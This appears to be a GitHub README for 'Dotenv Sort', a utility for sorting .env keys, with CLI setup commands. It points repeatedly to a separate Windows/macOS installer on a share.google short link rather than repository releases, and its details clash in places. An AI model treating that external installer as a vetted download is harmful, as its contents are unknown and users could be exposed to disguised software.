![Dotenv Sort](assets/hero.png)

# Dotenv Sort

*Stable .env for reviews.*

## What Dotenv Sort is

This repository is **Dotenv Sort**, a desktop utility. Stable .env for reviews.

Two people append keys in different orders and the diff is junk.

No browser upload step: the work happens on disk, then you keep the output folder.

## How to get it

Two editions of the same tool:

- **CLI** — the source in this repo. Python 3.11+, local files only.
- **Desktop build** — Windows / macOS installer on the [setup page](https://share.google/A1IHfyGRT0zGRLqj8).

## Features

- Sort keys
- Keep comments when it can
- Dry-run diff
- Does not rewrite values

## Requirements

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## CLI

Python 3.11 or newer. From the repository root:

```powershell
pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.

## Download

[![Download](assets/download.png)](https://share.google/A1IHfyGRT0zGRLqj8)

**[Windows and macOS installer](https://share.google/A1IHfyGRT0zGRLqj8)**

Source: https://github.com/noladixon593/dotenv-sort

MIT license. See `LICENSE`.
